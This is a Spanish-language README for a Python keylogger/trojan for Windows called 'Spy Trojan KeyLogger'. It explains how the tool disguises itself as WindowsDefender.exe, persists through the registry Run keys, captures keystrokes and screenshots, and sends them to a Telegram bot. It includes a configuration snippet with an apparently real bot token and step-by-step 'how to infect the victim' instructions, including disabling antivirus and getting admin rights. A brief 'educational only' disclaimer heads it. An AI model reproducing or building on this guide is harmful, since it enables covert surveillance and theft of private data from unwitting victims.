````
█▀ █▀█ █▄█   ▀█▀ █▀█ █▀█   █ ▄▀█ █▄ █   █▄▀ █▀▀ █▄█ █   █▀█ █▀▀ █▀▀ █▀▀ █▀█
▄█ █▀▀  █     █  █▀▄ █▄█ █▄█ █▀█ █ ▀█   █ █ ██▄  █  █▄▄ █▄█ █▄█ █▄█ ██▄ █▀▄ v6.0  
````

---
# __¡ Nota importante !:__ Ésta herramienta tiene como único proposito general, el aprendizaje de ___"Seguridad en sistemas informáticos"___, el creador no se hace responsable por un posible mal uso de ésta herramienta.
---



## Información
* __Nombre:__ `Spy Trojan KeyLogger`
* __Documentación:__ `11/12/20` 
* __Versión:__ `6.0`
* __Estado:__` Estable`
* __Plataforma:__` Windows 7, 8.1 y 10`
* __Lenguaje:__` Python > 3.8`


# __¡ Nota importante !:__ Ésta documentación está en proceso de escritura... algunos datos no están completas

# Carpeta Principal
![Archivos](https://imgur.com/eGfbb26.png)

* __.git:__` Python > 3.8`
* __.idea:__` Python > 3.8`
* __Doc:__` Python > 3.8`
* __venv:__` Python > 3.8`
* __# Create .EXE [InfectionFile]-[Debug].bat:__` Python > 3.8`
* __# Create .EXE [InfectionFile]-[Release].bat:__` Python > 3.8`
* __# Create .EXE [SpyTrojan]-[Debug].bat:__` Python > 3.8`
* __# Create .EXE [SpyTrojan]-[Release].bat:__` Python > 3.8`
* __#=[Infection] Run.bat:__` Python > 3.8`
* __#=[SpyTrojan] Run.bat:__` Python > 3.8`
* __.gitignore:__` Python > 3.8`
* __ConfigKey.ini:__` Python > 3.8`
* __icon_infection_file.ico:__` Python > 3.8`
* __icon_SpyTrojan.ico:__` Python > 3.8`
* __InfectionFile.py:__` Python > 3.8`
* __info_exe_InfectionFile.txt:__` Python > 3.8`
* __info_exe_SpyTrojan.txt:__` Python > 3.8`
* __InstallRequirements.bat:__` Python > 3.8`
* __LICENSE:__` Python > 3.8`
* __README.md:__` Python > 3.8`
* __SpyTrojan.py:__` Python > 3.8`

---


# Caracteristicas

- __Segundo plano:__ Este keylogger, al ejecutarse en la linea de comando, sí mostrará una consola, solo por detalles de debuggeo, pero al ser compilada de `*.py` a `*.exe` el ejecutable resultante se ejecutará en segundo plano

    `NOTA: imagen no actual`

    ![Segundo plano](https://i.imgur.com/DFAf2Tw.png)

- __Disfraz:__ Al momento de ser convertido de `*.py a *.exe`. El Keylogger será disfrazado como `WindowsDefender.exe` con el ícono y la información del programa.

    `NOTA: imagen no actual`

    ![ExeCompilado](https://i.imgur.com/TlBEAaS.png)

    ![Info](https://i.imgur.com/MQAiVnJ.png) 
    ![Info](https://i.imgur.com/mTBByRy.png)

    ![StartUP Info](https://i.imgur.com/bkGSFQC.png)
- __Oculto__ 

- __Iniciar automaticamente con el sistema:__ Modifica el registro de windows, 

    `NOTA: imagen no actual`

    ![StartUp](https://i.imgur.com/xh91bR5.png)

- __Multiples cuentas:__ Soporte a multiples cuentas 
- __Envio mediante Bot Telegram:__ Envia todos los datos mediante telegram
- __Screenshot:__ Toma capturas de pantalla con un intervalo personalizado 
    ![](https://i.imgur.com/NpNzd4b.png)

    ![](https://i.imgur.com/r2otz8z.png)


## Uso de Recursos de la PC
El programa se repite 2 veces ya que ésta utiza 2 hilos de ejecución

![Uso del CPU y RAM](https://i.imgur.com/DFAf2Tw.png)

---
---
# Proceso de preparación:

__NOTA:__ Como requisito mínimo para el aprendizaje de ésta herramienta es saber programar en __Python básico__.

Requerimiento de paquetes de `Python > 3.8`:



# [Configuración] BotTelegram

1. Entramos a [BotFather](https://telegram.me/BotFather).
    
    ![botFather](https://i.imgur.com/1dtdBO6.png)

2. Creamos un nuevo bot y obtenemos el Token privado
    
    ![](https://i.imgur.com/oRYutuu.png)

3. Ahora obtenemos nuestro `Chat ID`, esto se realiza para que solo el registro de teclas nos llegue a nosotros y no a cualquiera que encuentre el bot.

4. Buscamos el Bot llamado [Chat ID Echo](https://telegram.me/chatid_echo_bot) y obtenemos nuestro Chat ID
    
    ![CHAT ID](https://i.imgur.com/tJttP3i.png)

5. Ya tenemos nuestro `Token del bot` y nuestro `Chat ID` ahora tenemos que abrir nuestro archivo `WindowsDefender.py` y colocar esos datos siguientes métodos:

    __NOTA:__ Podemos tener hasta 3 ID distintos y a todos les llegaran los mismos datos, si solo usará uno, no modifique los valores del ID_2 e ID_3

    ````py
    # Importante
        self.TIMESEND = 26 #[minutos]                                                # Tiempo de envió del registro
        self.MODE = 2     # 0 = Gmail
                          # 1 = DataBase                                            # Solo se puede usar una opción
                          # 2 = TelegramBot

        class TelegramBot:
        def __init__(self):
            self.ID   = 831756903                                                     # ID Principal [Obligatorio]
            self.ID_2 = 000000000                                                     # ID secundario [Opcional]
            self.ID_3 = 000000000                                                     # ID Terciario  [Opcional]
            self.TOKEN = "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8"             # TOKEN de tu Bot [Obligatorio]


    # ************ Zona Telegram ************* 
    ````
6. Buscamos nuestro bot y la iniciamos...

    ![Buscando nuestro bot](https://i.imgur.com/2IA7ec8.png)

    ![iniciando bot](https://i.imgur.com/1r9F2IU.png)

6. Ejemplo del funcionamiento

    ![Ejemplo de funcionamiento telegram](https://i.imgur.com/QHLYDi9.png)

# [Si usted desea modificar el keylogger lea la siguiente documentación aquí.](Doc/CustomKey.md)

# Modo Debugger
Si ya configuró o bien la base de datos, Gmail o Telegram, si deseas saber si todo está Ok, pues ejecuta el archivo `Ejecuta.bat`, esta ejecutará el `SpyTrojanKeylogger.py` en modo debugg, la cual mostrará información en la consola:
- Mensaje de Error o Exito de __[StartUp]__ 
- Mensaje de Error o Exito de la caracteristica __`Trojan`__
- Teclas oprimidas a tiempo real
- Mensaje de Error o Exito al envía el registro por Gmail
- Mensaje de Error o Exito al conectarse con la base de datos.
- Mensaje de Error o Exito al envíar el registro mediante Telegram
- Otros posibles errores de __`import lib`__

 __[Si tiene problemas con las librerías intenta reinstalar python e instalar las librerías manualmente.]__

![asd](https://i.imgur.com/1jfgC0O.png)

# Convertir `*.py` a `*.exe`
Una vez todo configurado, lo siguiente es convertir nuestro archivo `py` a un `exe`  y en el proceso disfrazarlo.

- Ejecutamos el archivo:
    
    ![Compile.bat](https://i.imgur.com/RU12Dsy.png)

    ![Compile ejecutandose](https://i.imgur.com/weGPkTn.png)

- Luego de terminar aparecerá en la consola `Press any key to continue...`

    ![Complile.bat terminado](https://i.imgur.com/GHBtZKI.png)
- Regresamos a la carpeta principal y notamos que tenemos nuevas carpetas y archivos, las cuales son archivos caché sin ninguna importancia, donde e encuentrá nuestro troyano es dentro de la carpeta `EXE Final`.

    ![Carpeta final](https://i.imgur.com/ljoZLXJ.png)

- Compilación terminada:

    ![](https://i.imgur.com/V0MI65n.png)


# Método de infección:
___¿Cómo infecto a la victima?___

![Final files](https://i.imgur.com/TlBEAaS.png)

__Nota:__ No cambiar de nombre al archivo `WindowsDefender.exe`, si usted le cambia el nombre, el Keylogger quedará obsoleto.
- Usten guardará el archivo en un USB.
- Conectará el __USB__ a la __[PC]__ a infectar.
- Se recomienda desactivar el antivirus o agregar una exclusión en al siguiente ruta: `"C:\Users\Public\Security\Windows Defender"`.
- Lo siguiente es ejecutar el archivo `WindowsDefender.exe` en el USB, el Keylogger se replicará en la siguiente ruta `"C:\Users\Public\Security\Windows Defender"`, Se recomienda no sacar el USB al instante ya que el `Keylogger` se estará replicando en la ruta.

__NOTA:__ Al ejecutar el archivó, ésta automaticamente modificará el registro de windows para que se inicie siempre al prender la computadora.

El Keylogger modificará la siguiente ruta del registro `"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"` por lo cual necesitará permisos de administrador, por ende se recomienda que la primera ejecución se realice con permisos de administrador, en caso de que no lo ejecute con permisos de administrador, el Keylogger modificará la siguiente ruta `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"`

__Explicación:__ 
* `HKEY_LOCAL_MACHINE:` El Keylogger se ejecutará en todos los usuarios exitentes y los nuevos usuarios de la computadora
* `HKEY_CURRENT_USER:` El Keylogger solo se ejecutará en el usuario actual, si se llegará a crear otro usuario, el Keylogger Solo funcionará en el usuario principal
<!-- Creador  -->
---

## Lista de Cambios de la Verión 5 al 6
````r
[-] Se eliminó soporte de envio mediante una conexión a base de datos
[-] Se eliminó soporte de envio mediante Gmail
[-] 
[-]
[-]
[-]
[+]
[+] 
[+]
[+]
[+]

````

## By SebastianEPH
__Nota:__ Contacteme solo si encontró un bug o desea aportar al repositorio, gracias.

- [Website](https://sebastianeph.github.io/)
- [Github](https://github.com/SebastianEPH)
- [Facebook](https://www.facebook.com/SebastianEPH)
<!--- - [Telegram](https://t.me/sebastianeph) -->